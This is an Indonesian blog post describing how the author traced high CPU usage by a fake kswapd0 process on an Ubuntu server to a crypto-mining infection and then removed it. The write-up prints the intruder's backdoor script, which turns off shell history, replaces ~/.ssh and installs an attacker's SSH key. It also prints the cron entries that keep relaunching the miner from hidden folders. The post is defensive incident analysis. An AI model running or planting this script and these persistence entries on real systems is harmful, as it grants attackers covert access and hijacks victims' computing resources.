<!DOCTYPE html>
<html lang="id-ID">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>How to Deal With High CPU Usage kswapd0 on Linux | NyanDev Blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="/icons/favicon.ico">
    <link rel="icon" type="image/png" sizes="192x192" href="/icons/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="36x36" href="/icons/android-icon-36x36.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/icons/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="manifest" href="/manifest.json">
    <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-icon-120x120.png">
    <link rel="preconnect" href="https://cdn.statically.io">
    <link rel="preconnect" href="https://telegra.ph">
    <script src="https://cdn.statically.io/gh/aFarkas/lazysizes/gh-pages/lazysizes.min.js" async=""></script>
    <link rel="alternate" type="application/rss+xml" href="https://blog.nyandev.id/rss.xml" title="NyanDev Blog RSS Feed">
    <link rel="alternate" type="application/atom+xml" href="https://blog.nyandev.id/feed.atom" title="NyanDev Blog Atom Feed">
    <link rel="alternate" type="application/json" href="https://blog.nyandev.id/feed.json" title="NyanDev Blog JSON Feed">
    <meta name="description" content="High CPU Usage pada aplikasi kswapd0 bisa berarti SWAP atau bahkan Mining.">
    <meta name="keywords" content="kswapd0,ubuntu,linux,debian,cpu,production,server">
    <meta property="article:published_time" content="2020-09-30T03:55:23.000Z">
    <meta property="article:modified_time" content="2020-09-30T13:46:33.000Z">
    <meta property="og:site_name" content="NyanDev Blog">
    <meta property="og:title" content="How to Deal With High CPU Usage kswapd0 on Linux">
    <meta property="og:description" content="High CPU Usage pada aplikasi kswapd0 bisa berarti SWAP atau bahkan Mining.">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://blog.nyandev.id/devops/deal-with-high-cpu-kswapd0.html">
    <meta property="og:image" content="https://blog.nyandev.id/images/covers/how-to-deal-with-kswapd0-on-linux.jpg">
    <meta name="twitter:title" content="How to Deal With High CPU Usage kswapd0 on Linux">
    <meta name="twitter:description" content="High CPU Usage pada aplikasi kswapd0 bisa berarti SWAP atau bahkan Mining.">
    <meta name="twitter:url" content="https://blog.nyandev.id/devops/deal-with-high-cpu-kswapd0.html">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://blog.nyandev.id/images/covers/how-to-deal-with-kswapd0-on-linux.jpg">
    <meta property="og:image:alt" content="How to Deal With High CPU Usage kswapd0 on Linux">
    <meta property="og:image:width" content="450">
    <meta property="article:author" content="https://facebook.com/ryan.hac">
    <meta name="theme-color" content="#65c59a">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="preload" href="/assets/css/0.styles.32b1d79a.css" as="style"><link rel="preload" href="/assets/js/app.7e510d46.js" as="script"><link rel="preload" href="/assets/js/2.9f835e0b.js" as="script"><link rel="preload" href="/assets/js/18.d95f131f.js" as="script"><link rel="preload" href="/assets/js/4.40f398e1.js" as="script"><link rel="preload" href="/assets/js/6.fe87e115.js" as="script"><link rel="preload" href="/assets/js/8.921718ba.js" as="script"><link rel="prefetch" href="/assets/js/10.99d7ed95.js"><link rel="prefetch" href="/assets/js/11.9874722c.js"><link rel="prefetch" href="/assets/js/12.44d458dd.js"><link rel="prefetch" href="/assets/js/13.d175c0bc.js"><link rel="prefetch" href="/assets/js/14.7b0734d4.js"><link rel="prefetch" href="/assets/js/15.93154e45.js"><link rel="prefetch" href="/assets/js/16.57bb0bb9.js"><link rel="prefetch" href="/assets/js/17.fef3c5e9.js"><link rel="prefetch" href="/assets/js/19.27096e36.js"><link rel="prefetch" href="/assets/js/20.1803883b.js"><link rel="prefetch" href="/assets/js/21.3c882dde.js"><link rel="prefetch" href="/assets/js/22.d4e6a8ab.js"><link rel="prefetch" href="/assets/js/23.e60b0102.js"><link rel="prefetch" href="/assets/js/24.1874fb7b.js"><link rel="prefetch" href="/assets/js/25.3b5a154d.js"><link rel="prefetch" href="/assets/js/26.f52819cd.js"><link rel="prefetch" href="/assets/js/27.3669038a.js"><link rel="prefetch" href="/assets/js/28.5f570948.js"><link rel="prefetch" href="/assets/js/29.694510fc.js"><link rel="prefetch" href="/assets/js/3.4bda5e48.js"><link rel="prefetch" href="/assets/js/30.ab8d1ccf.js"><link rel="prefetch" href="/assets/js/31.ac8d6686.js"><link rel="prefetch" href="/assets/js/32.c1b26e5a.js"><link rel="prefetch" href="/assets/js/33.9309aed6.js"><link rel="prefetch" href="/assets/js/34.3f8ec3a5.js"><link rel="prefetch" href="/assets/js/35.aa42c23e.js"><link rel="prefetch" href="/assets/js/36.12994f0d.js"><link rel="prefetch" href="/assets/js/37.73df454c.js"><link rel="prefetch" href="/assets/js/38.40f46242.js"><link rel="prefetch" href="/assets/js/39.dc358b15.js"><link rel="prefetch" href="/assets/js/40.f736adf1.js"><link rel="prefetch" href="/assets/js/41.564da301.js"><link rel="prefetch" href="/assets/js/42.d273b766.js"><link rel="prefetch" href="/assets/js/5.b7ea8e87.js"><link rel="prefetch" href="/assets/js/7.b95f864c.js"><link rel="prefetch" href="/assets/js/9.8721d71e.js">
    <link rel="stylesheet" href="/assets/css/0.styles.32b1d79a.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">NyanDev Blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  Home
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Javascript" class="dropdown-title"><span class="title">Javascript</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/javascript/" class="nav-link">
  Javascript
</a></li><li class="dropdown-item"><!----> <a href="/preact/" class="nav-link">
  Preact
</a></li><li class="dropdown-item"><!----> <a href="/preact/belajar-preact/" class="nav-link">
  Series: Belajar Preact
</a></li></ul></div></div><div class="nav-item"><a href="/devops/" class="nav-link router-link-active">
  Devops
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Others" class="dropdown-title"><span class="title">Others</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tips/" class="nav-link">
  Tips
</a></li><li class="dropdown-item"><!----> <a href="/informasi/" class="nav-link">
  Informasi
</a></li><li class="dropdown-item"><!----> <a href="/bookmark/" class="nav-link">
  Bookmark
</a></li></ul></div></div> <a href="https://github.com/nyancodeid/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  Home
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Javascript" class="dropdown-title"><span class="title">Javascript</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/javascript/" class="nav-link">
  Javascript
</a></li><li class="dropdown-item"><!----> <a href="/preact/" class="nav-link">
  Preact
</a></li><li class="dropdown-item"><!----> <a href="/preact/belajar-preact/" class="nav-link">
  Series: Belajar Preact
</a></li></ul></div></div><div class="nav-item"><a href="/devops/" class="nav-link router-link-active">
  Devops
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Others" class="dropdown-title"><span class="title">Others</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tips/" class="nav-link">
  Tips
</a></li><li class="dropdown-item"><!----> <a href="/informasi/" class="nav-link">
  Informasi
</a></li><li class="dropdown-item"><!----> <a href="/bookmark/" class="nav-link">
  Bookmark
</a></li></ul></div></div> <a href="https://github.com/nyancodeid/blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <!----> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="how-to-deal-with-high-cpu-usage-kswapd0-on-linux"><a href="#how-to-deal-with-high-cpu-usage-kswapd0-on-linux" class="header-anchor">#</a> How to Deal With High CPU Usage kswapd0 on Linux</h1> <div class="author d-flex"><div class="author-main d-flex"><div class="author-avatar"><img src="/images/profiles/avatar.jpg" alt="Ryan Aunur Rassyid" width="48" height="48"> <!----></div> <div class="author-detail"><div><span>Ryan Aunur Rassyid</span> <div class="author-detail--follow"><button>Follow</button></div></div> <span>Sept 30, 2020 · 6 min read</span></div></div> <div class="author-social d-flex"><div class="author-social-wrapper d-flex"><div><a href="https://twitter.com/AunurRyan" target="_blank"><svg width="29" height="29" class="q"><path d="M22.05 7.54a4.47 4.47 0 0 0-3.3-1.46 4.53 4.53 0 0 0-4.53 4.53c0 .35.04.7.08 1.05A12.9 12.9 0 0 1 5 6.89a5.1 5.1 0 0 0-.65 2.26c.03 1.6.83 2.99 2.02 3.79a4.3 4.3 0 0 1-2.02-.57v.08a4.55 4.55 0 0 0 3.63 4.44c-.4.08-.8.13-1.21.16l-.81-.08a4.54 4.54 0 0 0 4.2 3.15 9.56 9.56 0 0 1-5.66 1.94l-1.05-.08c2 1.27 4.38 2.02 6.94 2.02 8.3 0 12.86-6.9 12.84-12.85.02-.24 0-.43 0-.65a8.68 8.68 0 0 0 2.26-2.34c-.82.38-1.7.62-2.6.72a4.37 4.37 0 0 0 1.95-2.51c-.84.53-1.81.9-2.83 1.13z"></path></svg></a></div> <div><a href="https://www.facebook.com/ryan.hac" target="_blank"><svg width="29" height="29" class="q"><path d="M23.2 5H5.8a.8.8 0 0 0-.8.8V23.2c0 .44.35.8.8.8h9.3v-7.13h-2.38V13.9h2.38v-2.38c0-2.45 1.55-3.66 3.74-3.66 1.05 0 1.95.08 2.2.11v2.57h-1.5c-1.2 0-1.48.57-1.48 1.4v1.96h2.97l-.6 2.97h-2.37l.05 7.12h5.1a.8.8 0 0 0 .79-.8V5.8a.8.8 0 0 0-.8-.79"></path></svg></a></div> <div><a href="https://medium.com/@ryandevstudio" target="_blank"><svg enable-background="new 0 0 24 24" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m7.996 21.324c0 .695-.521.982-1.098.695l-6.228-3.113c-.188-.089-.346-.238-.475-.447s-.195-.417-.195-.622v-15.227c0-.568.341-.825 1.112-.441l6.844 3.42c.099.099.026-.581.04 15.735zm.857-14.32 7.152 11.568-7.152-3.553zm15.147.241v14.079c0 .223-.062.403-.188.541-.125.138-.295.207-.509.207s-.424-.058-.629-.174l-5.906-2.939zm-.04-1.603c0 .027-1.145 1.895-3.435 5.603s-3.632 5.88-4.025 6.512l-5.223-8.469 4.339-7.039c.236-.388.72-.456 1.045-.294l7.246 3.607c.035.017.053.044.053.08z"></path></svg></a></div></div></div></div> <p class="featured-image"><img alt="How to Deal With High CPU Usage kswapd0 on Linux" title="How to Deal With High CPU Usage kswapd0 on Linux | NyanDev Blog" data-src="/images/covers/how-to-deal-with-kswapd0-on-linux.jpg" src="/images/covers/how-to-deal-with-kswapd0-on-linux.jpg" class="no-zoom lazy"> <span class="featured-image--subtitle">(featured image by <u>Jase Bloor</u> on <u><a href="https://unsplash.com/photos/By1VMCg3K4I"   rel="noopener noreferrer" target="_blank">unsplash.com</a></u>)</span></p> <h2 id="introduction"><a href="#introduction" class="header-anchor">#</a> Introduction</h2> <p>Beberapa waktu yang lalu penulis sempat menghandle Project yang menggunakan server fisik (bukan VPS). Server tersebut menggunakan Ubuntu 16.04 sebagai <em>Operating System</em>-nya. Namun OS yang dipakai tidak sama dengan OS yang penulis pakai setiap kali deploy VPS, padahal versi Ubuntu yang dipakai sama persis yaitu Ubuntu 16.04 tapi serasa seperti Debian. Banyak package package yang hilang atau tidak ada padahal package tersebut seharusnya ada di OS tersebut bahkan fresh install sekalipun.</p> <p>Aplikasi berjalan baik dan tanpa kendala, hanya saja berjalan agak pelan untuk ukuran server dengan prosessor 8 core tersebut. Seharusnya aplikasi berjalan lebih baik bukan?. Oke mulai mulai dari sini mulai curiga. Apakah server menjalankan aplikasi lain yang menyebabkan aplikasi lain tidak memiliki cukup resource yang dipakai atau aplikasi yang kita kerjakan memang lamban. Akhirnya investigasi dimulai.</p> <h2 id="table-of-contents"><a href="#table-of-contents" class="header-anchor">#</a> Table of Contents</h2> <p></p><div class="table-of-contents"><ul><li><a href="#introduction">Introduction</a></li><li><a href="#table-of-contents">Table of Contents</a></li><li><a href="#apa-itu-kswapd0">Apa itu kswapd0?</a><ul><li><a href="#what-now">What now?</a></li><li><a href="#menghapus-aplikasi">Menghapus aplikasi</a></li><li><a href="#virus-total">Virus Total</a></li></ul></li><li><a href="#kesimpulan">Kesimpulan</a></li></ul></div><p></p> <h2 id="apa-itu-kswapd0"><a href="#apa-itu-kswapd0" class="header-anchor">#</a> Apa itu kswapd0?</h2> <p>Singkat cerita ditemukan akar masalahnya, yaitu aplikasi <strong>kswapd0</strong> yang berjalan menggunakan resource CPU 100% terus menerus. Ini sangat tidak wajar untuk aplikasi yang mengatur dan me-<em>manage</em> SWAP atau virtual memory pada Linux. Karena ini hal baru yang belum pernah penulis jumpai selama memakai SWAP di Linux, jadi penulis mencoba mengumpulkan informasi dari semua forum-forum apa itu <em>kswapd0</em> dan mengapa memakan resource CPU yang banyak.</p> <p>Ada forum yang berpendapat bahwa kejadian ini adalah bug dari linux yang harusnya sudah di-fix di versi yang baru sedangkan ada beberapa orang berpendapat bahwa ini disebabkan oleh server yang menggunaakn hardisk dari pada SSD sebagai SWAP sehingga CPU dan Hardisk dipaksa bekerja dengan semaksimal mungkin. Team memutuskan untuk upgrade versi package yang kadarluasa dengan menjalankan <code>apt get upgrade</code>. Dan bener saja banyak package yang diupgrade pada waktu itu. Namun ini tidak menuntaskan masalah, <strong>kswapd0</strong> tetap berjalan.</p> <p><img src="https://telegra.ph/file/2b542fc07f6a6a176c072.jpg" alt="kswapd0 terlihat berjalan di aplikasi monitoring htop"> <em>Aplikasi kswapd0 terlihat berjalan di aplikasi monitoring htop</em></p> <h3 id="what-now"><a href="#what-now" class="header-anchor">#</a> What now?</h3> <p>Akhirnya kami putuskan untuk menghapus SWAP dari pada penggunaan CPU terus dipakai tanpa ampun. Setelah dihapus apakah masalah ini selesai? sayangnya tidak. Aplikasi tersebut masih berjalan bahkan tanpa adanya SWAP. Lalu apa sebenernya eksistensi dari aplikasi ini?. Akhirnya penulis putuskan untuk investigasi mendalam dan mencoba mengumpulkan informasi lagi di forum. Kali ini penulis mendapatkan secercah cahaya apa maksud dari semua ini. Setelah membaca log Cron Job yang mencurigakan akhirnya didapati pertanyaan yang related dengan masalah ini.</p> <a href="https://askubuntu.com/questions/1161003/strange-cron-job-takes-up-100-of-cpu-ubuntu-18-lts-server" target="_blank" class="link-preview"><div class="link-preview--content"><p class="title">Strange Cron Job takes up 100% of CPU Ubuntu 18 LTS Server - Ask Ubuntu</p><p>I keep getting weir cron jobs showing up and I have no clue what they do. I typically issue kill -9  to stop them. They take up 100% of my CPU and can run for days until I check. Does anyone know w...</p> <p>askubuntu.com</p></div><div class="link-preview--thumbnail" style="background-image:url(https://cdn.sstatic.net/Sites/askubuntu/Img/apple-touch-icon@2.png?v=c492c9229955);"></div></a><p>Usut punya usut ternyata aplikasi tersebut adalah aplikasi <strong>Crypto Mining</strong>. Siapa sangka aplikasi ini bisa masuk pada sistem operasi linux yang baru di install. Aplikasi Crypto Mining sendiri adalah aplikasi yang menjalankan proses mining (memecahkan algoritma rumit) yang memerlukan sebuah resource khususnya CPU atau GPU. Keuntungan yang didapat dari mining adalah Cryptocurrency atau mata uang digital. Karena aplikasi ini berjalan tanpa izin dan dijalankan pada komputer atau server orang lain maka aplikasi ini termasuk tindakan yang merugikan orang lain. Aplikasi ini berjalan tanpa henti dan menggunakan semua resource CPU yang ada hingga 100% yang bisa memperpendek umur prosessor karena dipaksa melakukkan pekerjaan keras dalam waktu lama dan terus menerus.</p> <h3 id="menghapus-aplikasi"><a href="#menghapus-aplikasi" class="header-anchor">#</a> Menghapus aplikasi</h3> <p>Tidak ada faedahnya membuat aplikasi ini tetap berada di server. Alih alih membiarkan aplikasi tetap berjalan saya memilih untuk menghapus aplikasi ini. Sebelum itu saya lebih penasaran bagaimana aplikasi ini bisa masuk. Asumsi awal adalah aplikasi ini masuk dengan cara SCP atau transfer remote file melalui SSH. Kok bisa? bisa, karena di SSH folder <code>$HOME/.ssh/</code> ada file <code>authorized_keys</code> yang artinya orang bisa mengakses server kapan saja tanpa password karena Linux mempercayai sepenuhnya pelaku. Dan ini bisa terjadi karena OS yang di-install bukan dari OS resmi dari Ubuntu atau Debian dengan kata lain injected. File instalasi OS bisa saja di susupi script untuk membuat <code>authorized_keys</code> seperti berikut.</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token builtin class-name">set</span> +o <span class="token function">history</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/home/user/.bin:<span class="token environment constant">$PATH</span>
<span class="token builtin class-name">cd</span> ~ <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> -rf .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr&quot;</span><span class="token operator">&gt;&gt;</span>.ssh/authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">700</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> .ssh <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">600</span> authorized_keys <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> ~
</code></pre></div><p>Setelah pelaku sudah memiliki akses ke server kita melalui ssh, selanjutnya pelaku tinggal mengirim file mining tersebut ke server kita dan menjalankan nya dengan cron job. Kenapa cron job? karena disini aplikasi akan mendeteksi apakah aplikasi mining nya berjalan atau tidak. Apabila aplikasi dihentikan paksa dengan <code>kill -9 PID</code> misalnya, maka aplikasi akan kembali berjalan setelah beberapa menit. Dan jika file aplikasi di hapus maka secara otomatis aplikasi akan di sync untuk mendapatkan file crypto mining dan menjalankannya kembali. Terdengar menarik bukan.</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">1</span> <span class="token number">1</span> */2 * * /home/user/.configrc/a/upd<span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
@reboot /home/user/.configrc/a/upd<span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token number">5</span> <span class="token number">8</span> * * <span class="token number">0</span> /home/user/.configrc/b/sync<span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
@reboot /home/user/.configrc/b/sync<span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>  
<span class="token number">0</span> <span class="token number">0</span> */3 * * /tmp/.X25-unix/.rsync/c/aptitude<span class="token operator">&gt;</span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><p>Dan ini adalah struktur folder dari folder aplikasi tersebut disimpan <code>$HOME/.configrc</code>. Nama folder yang cukup meyakinkan untuk tidak di cek, karena kita akan berfikir bahwa folder ini mungkin bagian dari folder <code>.config</code> yang hanya berisi config dari aplikasi-aplikasi di linux.</p> <div class="language- extra-class"><pre class="language-text"><code>.
├── a
│   ├── a
│   ├── bash.pid
│   ├── dir.dir
│   ├── init0
│   ├── kswapd0
│   ├── run
│   ├── stop
│   └── upd
├── b
│   ├── a
│   ├── dir.dir
│   ├── run
│   ├── stop
│   └── sync
├── cron.d
└── dir2.dir
</code></pre></div><p>Setelah aplikasi di berhentikan dan dihapus dari server, penggunaan resource CPU menjadi normal kembali. Untuk meyakinkan bahwa program tersebut sudah tidak aktif kembali dan semua file dan service sudah dihapus dan berhenti, kami menunggu untuk beberapa saat. Yes, aplikasi tidak berjalan kembali dan di monitoring system juga tidak nampak keanehan kembali.</p> <h3 id="virus-total"><a href="#virus-total" class="header-anchor">#</a> Virus Total</h3> <p>Kita pastikan kembali bahwa ini adalah aplikasi Crypto Mining dengan cara upload file <strong>kswapd0</strong> tersebut ke website <a href="https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection" target="_blank" rel="noopener noreferrer">virustotal<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>. Hasilnya dipastikan bahwa ini bukan file <strong>kswapd0</strong> yang asli atau bawaan Linux melainkan aplikasi Crypto Mining.</p> <p><img src="https://telegra.ph/file/9c9b44a1073398b6c30a5.png" alt="Hasil scan pada website VirusTotal.com"> <em>Hasil scan pada website <a href="https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection" target="_blank" rel="noopener noreferrer">VirusTotal.com<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></em></p> <h2 id="kesimpulan"><a href="#kesimpulan" class="header-anchor">#</a> Kesimpulan</h2> <p>Sebuah aplikasi yang menggunakan resource berlebih apalagi CPU perlu kita curigai dan usut sampai tuntas apa yang menyebabkan ia menggunakan CPU dengan tidak normal seperti itu. Dalam kasus ini aplikasi bernama <strong>kswapd0</strong> ini menjelma menjadi sebuah aplikasi yang cukup <em>make sense</em> untuk menggunakan resource besar tapi <em>behavior</em> dari aplikasi ini sendiri tidak seperti pada umunya.</p> <p>Dari sini kita bisa mengambil pelajaran bahwa jangan langsung percaya dengan apa yang kita lihat. Sebelum ada bukti yang kuat kita tidak bisa mengatakan bahwa aplikasi ini baik baik saya dan berjalan sebagaimana mestinya. Bisa jadi aplikasi tersebut sedang menyamar menjadi aplikasi lain.</p> <div id="disqus_thread"><div id="disqus_empty"></div></div></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/nyancodeid/blog/edit/master/devops/deal-with-high-cpu-kswapd0.md" target="_blank" rel="noopener noreferrer">Help us improve this page!</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">9/30/2020, 8:46:33 PM</span></div></footer> <!----> </main></div><div class="global-ui"><!----></div></div>
    <script src="/assets/js/app.7e510d46.js" defer></script><script src="/assets/js/2.9f835e0b.js" defer></script><script src="/assets/js/18.d95f131f.js" defer></script><script src="/assets/js/4.40f398e1.js" defer></script><script src="/assets/js/6.fe87e115.js" defer></script><script src="/assets/js/8.921718ba.js" defer></script>
  </body>
</html>
